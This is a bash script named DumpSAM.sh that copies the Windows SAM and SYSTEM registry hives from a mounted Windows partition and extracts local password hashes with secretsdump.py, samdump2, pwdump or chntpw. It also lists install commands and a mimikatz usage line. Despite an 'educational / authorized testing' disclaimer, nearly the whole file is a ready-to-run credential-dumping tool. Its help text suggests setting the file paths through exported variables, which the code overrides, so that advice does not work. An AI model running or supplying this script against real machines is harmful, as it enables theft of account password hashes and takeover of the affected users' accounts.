#!/bin/bash

################################################################################
# Script de Volcado de Base de Datos SAM
# SAM Database Dump Script
#
# Autor: RedTeam-Bypass
# Versión: 1.0
# Propósito: Educativo / Pruebas de penetración autorizadas
# Purpose: Educational / Authorized Penetration Testing
#
# ADVERTENCIA: Este script es solo para uso educativo y pruebas autorizadas.
# WARNING: This script is for educational and authorized testing only.
################################################################################

# Colores para salida
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
GRAY='\033[0;37m'
NC='\033[0m' # No Color

# Banner
show_banner() {
    echo -e "${CYAN}================================================${NC}"
    echo -e "${CYAN}   Volcado de Base de Datos SAM - DumpSAM.sh${NC}"
    echo -e "${CYAN}   SAM Database Dump Tool${NC}"
    echo -e "${CYAN}================================================${NC}"
    echo ""
}

# Verificar si se ejecuta en Linux con acceso a archivos Windows
check_environment() {
    echo -e "${YELLOW}[*] Verificando entorno...${NC}"
    
    # Verificar si se está ejecutando como root
    if [ "$EUID" -ne 0 ]; then 
        echo -e "${RED}[!] Este script debe ejecutarse como root${NC}"
        echo -e "${RED}[!] Uso: sudo $0${NC}"
        exit 1
    fi
    
    echo -e "${GREEN}[+] Ejecutando como root${NC}"
    
    # Determinar el entorno
    if [ -d "/mnt/c/Windows" ] || [ -d "/media" ]; then
        echo -e "${GREEN}[+] Entorno detectado: Sistema Linux con acceso a Windows${NC}"
        WINDOWS_AVAILABLE=true
    else
        echo -e "${YELLOW}[!] No se detectó sistema Windows montado${NC}"
        WINDOWS_AVAILABLE=false
    fi
    
    echo ""
}

# Mostrar información del sistema
show_system_info() {
    echo -e "${CYAN}[*] Información del Sistema:${NC}"
    echo -e "${WHITE}    Hostname:           $(hostname)${NC}"
    echo -e "${WHITE}    Usuario:            $(whoami)${NC}"
    echo -e "${WHITE}    Sistema Operativo:  $(uname -s)${NC}"
    echo -e "${WHITE}    Kernel:             $(uname -r)${NC}"
    echo ""
}

# Información educativa sobre SAM
show_sam_info() {
    echo -e "${CYAN}[*] Información sobre la Base de Datos SAM:${NC}"
    echo ""
    echo -e "${WHITE}La base de datos Security Account Manager (SAM) contiene:${NC}"
    echo -e "${GRAY}  - Nombres de usuario locales${NC}"
    echo -e "${GRAY}  - Hashes de contraseñas (NT hash, LM hash obsoleto)${NC}"
    echo -e "${GRAY}  - SIDs (Security Identifiers)${NC}"
    echo -e "${GRAY}  - Membresías de grupos${NC}"
    echo ""
    echo -e "${GRAY}Ubicación en Windows:${NC}"
    echo -e "${GRAY}  - Archivo: C:\Windows\System32\config\SAM${NC}"
    echo -e "${GRAY}  - Registro: HKLM\SAM\SAM\Domains\Account\Users${NC}"
    echo ""
    echo -e "${GRAY}Estructura de cifrado de hashes:${NC}"
    echo -e "${GRAY}  1. Hash MD4 de la contraseña (NT hash)${NC}"
    echo -e "${GRAY}  2. Cifrado DES con RID del usuario como clave${NC}"
    echo -e "${GRAY}  3. Cifrado con Password Encryption Key (PEK)${NC}"
    echo -e "${GRAY}  4. PEK cifrado con LSA System Key${NC}"
    echo ""
}

# Buscar archivos SAM en el sistema
find_sam_files() {
    echo -e "${YELLOW}[*] Buscando archivos SAM en el sistema...${NC}"
    echo ""
    
    # Posibles ubicaciones de archivos SAM
    local sam_locations=(
        "/mnt/c/Windows/System32/config/SAM"
        "/media/*/Windows/System32/config/SAM"
        "/mnt/*/Windows/System32/config/SAM"
        "/Windows/System32/config/SAM"
    )
    
    local system_locations=(
        "/mnt/c/Windows/System32/config/SYSTEM"
        "/media/*/Windows/System32/config/SYSTEM"
        "/mnt/*/Windows/System32/config/SYSTEM"
        "/Windows/System32/config/SYSTEM"
    )
    
    SAM_FILE=""
    SYSTEM_FILE=""
    
    # Buscar archivo SAM
    for location in "${sam_locations[@]}"; do
        if [ -f "$location" ]; then
            SAM_FILE="$location"
            echo -e "${GREEN}[+] Archivo SAM encontrado: $SAM_FILE${NC}"
            break
        fi
    done
    
    # Buscar archivo SYSTEM
    for location in "${system_locations[@]}"; do
        if [ -f "$location" ]; then
            SYSTEM_FILE="$location"
            echo -e "${GREEN}[+] Archivo SYSTEM encontrado: $SYSTEM_FILE${NC}"
            break
        fi
    done
    
    if [ -z "$SAM_FILE" ] || [ -z "$SYSTEM_FILE" ]; then
        echo -e "${YELLOW}[!] No se encontraron archivos SAM/SYSTEM en ubicaciones estándar${NC}"
        echo ""
        return 1
    fi
    
    echo ""
    return 0
}

# Copiar archivos SAM
copy_sam_files() {
    echo -e "${YELLOW}[*] Copiando archivos SAM y SYSTEM...${NC}"
    
    # Crear directorio temporal
    TEMP_DIR="/tmp/sam_dump_$$"
    mkdir -p "$TEMP_DIR"
    
    # Copiar archivos
    if [ -n "$SAM_FILE" ] && [ -f "$SAM_FILE" ]; then
        cp "$SAM_FILE" "$TEMP_DIR/sam.hive" 2>/dev/null
        if [ $? -eq 0 ]; then
            echo -e "${GREEN}[+] SAM copiado a: $TEMP_DIR/sam.hive${NC}"
        else
            echo -e "${RED}[!] Error al copiar SAM${NC}"
        fi
    fi
    
    if [ -n "$SYSTEM_FILE" ] && [ -f "$SYSTEM_FILE" ]; then
        cp "$SYSTEM_FILE" "$TEMP_DIR/system.hive" 2>/dev/null
        if [ $? -eq 0 ]; then
            echo -e "${GREEN}[+] SYSTEM copiado a: $TEMP_DIR/system.hive${NC}"
        else
            echo -e "${RED}[!] Error al copiar SYSTEM${NC}"
        fi
    fi
    
    echo ""
}

# Extraer hashes usando herramientas disponibles
extract_hashes() {
    echo -e "${YELLOW}[*] Intentando extraer hashes de contraseñas...${NC}"
    echo ""
    
    local sam_file="$TEMP_DIR/sam.hive"
    local system_file="$TEMP_DIR/system.hive"
    
    # Verificar si existen los archivos
    if [ ! -f "$sam_file" ] || [ ! -f "$system_file" ]; then
        echo -e "${RED}[!] Archivos SAM/SYSTEM no disponibles${NC}"
        return 1
    fi
    
    # Verificar herramientas disponibles
    local tool_found=false
    
    # 1. Intentar con secretsdump.py (Impacket)
    if command -v secretsdump.py &> /dev/null; then
        echo -e "${GREEN}[+] Usando secretsdump.py (Impacket)${NC}"
        secretsdump.py -sam "$sam_file" -system "$system_file" LOCAL
        tool_found=true
    
    # 2. Intentar con samdump2
    elif command -v samdump2 &> /dev/null; then
        echo -e "${GREEN}[+] Usando samdump2${NC}"
        samdump2 "$system_file" "$sam_file"
        tool_found=true
    
    # 3. Intentar con pwdump
    elif command -v pwdump &> /dev/null; then
        echo -e "${GREEN}[+] Usando pwdump${NC}"
        pwdump "$sam_file" "$system_file"
        tool_found=true
    
    # 4. Intentar con chntpw
    elif command -v chntpw &> /dev/null; then
        echo -e "${GREEN}[+] Usando chntpw${NC}"
        chntpw -l "$sam_file"
        tool_found=true
    fi
    
    if [ "$tool_found" = false ]; then
        echo -e "${YELLOW}[!] No se encontraron herramientas de extracción instaladas${NC}"
        echo ""
        show_extraction_tools
    fi
    
    echo ""
}

# Mostrar información sobre herramientas de extracción
show_extraction_tools() {
    echo -e "${CYAN}[*] Herramientas disponibles para extraer hashes:${NC}"
    echo ""
    echo -e "${WHITE}1. secretsdump.py (Impacket)${NC}"
    echo -e "${GRAY}   Instalación: pip install impacket${NC}"
    echo -e "${GRAY}   Uso: secretsdump.py -sam sam.hive -system system.hive LOCAL${NC}"
    echo ""
    echo -e "${WHITE}2. samdump2${NC}"
    echo -e "${GRAY}   Instalación: apt-get install samdump2${NC}"
    echo -e "${GRAY}   Uso: samdump2 system.hive sam.hive${NC}"
    echo ""
    echo -e "${WHITE}3. chntpw${NC}"
    echo -e "${GRAY}   Instalación: apt-get install chntpw${NC}"
    echo -e "${GRAY}   Uso: chntpw -l sam.hive${NC}"
    echo ""
    echo -e "${WHITE}4. mimikatz (Windows)${NC}"
    echo -e "${GRAY}   Uso: lsadump::sam /sam:sam.hive /system:system.hive${NC}"
    echo ""
    
    echo -e "${CYAN}[*] Archivos guardados en: $TEMP_DIR${NC}"
    echo -e "${WHITE}    SAM:    $TEMP_DIR/sam.hive${NC}"
    echo -e "${WHITE}    SYSTEM: $TEMP_DIR/system.hive${NC}"
    echo ""
}

# Limpiar archivos temporales
cleanup() {
    if [ -n "$TEMP_DIR" ] && [ -d "$TEMP_DIR" ]; then
        echo -e "${YELLOW}[?] ¿Desea eliminar los archivos temporales? (s/n): ${NC}"
        read -r response
        if [[ "$response" =~ ^[SsYy]$ ]]; then
            rm -rf "$TEMP_DIR"
            echo -e "${GREEN}[+] Archivos temporales eliminados${NC}"
        else
            echo -e "${YELLOW}[*] Archivos temporales conservados en: $TEMP_DIR${NC}"
        fi
    fi
}

# Función principal
main() {
    show_banner
    check_environment
    show_system_info
    show_sam_info
    
    # Buscar archivos SAM
    if ! find_sam_files; then
        echo -e "${YELLOW}[*] Puede montar una partición de Windows usando:${NC}"
        echo -e "${GRAY}    mount -t ntfs-3g /dev/sdXY /mnt/windows${NC}"
        echo ""
        echo -e "${YELLOW}[*] O puede especificar rutas manualmente:${NC}"
        echo -e "${GRAY}    export SAM_FILE=/ruta/a/sam${NC}"
        echo -e "${GRAY}    export SYSTEM_FILE=/ruta/a/system${NC}"
        echo ""
        exit 1
    fi
    
    # Preguntar si desea continuar
    echo -e "${YELLOW}[?] ¿Desea continuar con el volcado? (s/n): ${NC}"
    read -r response
    
    if [[ ! "$response" =~ ^[SsYy]$ ]]; then
        echo -e "${YELLOW}[*] Operación cancelada por el usuario${NC}"
        exit 0
    fi
    
    echo ""
    copy_sam_files
    extract_hashes
    
    echo -e "${CYAN}[*] Proceso completado${NC}"
    echo ""
    
    cleanup
}

# Manejador de señales para limpieza
trap cleanup EXIT

# Ejecutar función principal
main
